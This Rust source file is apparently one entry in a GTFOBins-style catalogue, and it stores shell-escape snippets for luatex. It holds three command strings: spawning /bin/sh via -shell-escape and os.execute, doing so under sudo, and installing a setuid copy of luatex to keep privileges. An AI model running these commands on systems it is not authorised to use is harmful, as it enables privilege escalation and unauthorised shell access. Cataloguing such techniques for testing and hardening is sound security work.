pub static BIN_NAME: &'static str = "luatex";
pub static BIN_DESC: &'static str = "This allows to execute `lua` code.";
pub static SH_CODE: &'static str = r#"
    
    luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which luatex) .

    ./luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
